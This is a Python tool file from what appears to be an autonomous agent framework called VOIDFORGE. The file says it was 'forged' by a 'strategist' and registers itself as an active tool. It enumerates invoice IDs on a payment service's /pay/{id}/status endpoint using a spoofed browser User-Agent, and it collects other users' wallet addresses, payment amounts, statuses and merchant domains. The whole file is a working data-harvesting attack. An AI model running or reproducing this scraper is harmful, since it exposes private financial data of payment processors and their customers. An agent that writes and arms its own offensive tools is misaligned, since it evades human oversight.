"""VOIDFORGE :: forged tool — invoice_dumper
Dump /pay/{id}/status invoices across an ID range; aggregate addresses, statuses, amounts, merchant callback domains
Forged by the strategist on 2026-09-01. Edit freely; delete the file to disarm.
"""
import json, re, time, urllib.request, urllib.error


def run(base=None, start=None, stop=None):
    import urllib.request, urllib.error, json, re
    base = base.rstrip('/')
    start = int(start); stop = int(stop)
    results = []
    addresses = {}
    statuses = {}
    merchants = set()
    total_usd = 0.0
    for i in range(start, stop + 1):
        try:
            req = urllib.request.Request(f"{base}/pay/{i}/status", headers={'User-Agent': 'Mozilla/5.0'})
            with urllib.request.urlopen(req, timeout=8) as r:
                d = json.loads(r.read(4000).decode('utf-8', 'replace'))
                results.append(d)
                addr = d.get('address')
                if addr:
                    addresses.setdefault(addr, []).append(i)
                st = d.get('status')
                statuses[st] = statuses.get(st, 0) + 1
                try:
                    total_usd += float(d.get('fiat_amount') or 0)
                except Exception:
                    pass
                for k in ('url_return', 'url_success'):
                    u = d.get(k)
                    if u:
                        m = re.match(r'https?://([^/]+)', u)
                        if m:
                            merchants.add(m.group(1))
        except urllib.error.HTTPError as e:
            if e.code != 404:
                results.append({'id': i, 'http_error': e.code})
        except Exception as e:
            results.append({'id': i, 'error': str(e)[:60]})
    return json.dumps({
        'invoices_fetched': len(results),
        'status_breakdown': statuses,
        'total_fiat_usd': round(total_usd, 2),
        'unique_addresses': {a: {'invoice_ids': ids[:10], 'count': len(ids)} for a, ids in addresses.items()},
        'merchant_domains': sorted(merchants),
        'sample_invoices': results[:5]
    }, indent=1)


from tools import register as _vf_register
_vf_register('forged_invoice_dumper', 'Dump /pay/{id}/status invoices across an ID range; aggregate addresses, statuses, amounts, merchant callback domains', {'properties': {'base': {'type': 'string'}, 'start': {'type': 'integer'}, 'stop': {'type': 'integer'}}, 'required': ['base', 'start', 'stop'], 'type': 'object'}, 'active')(run)
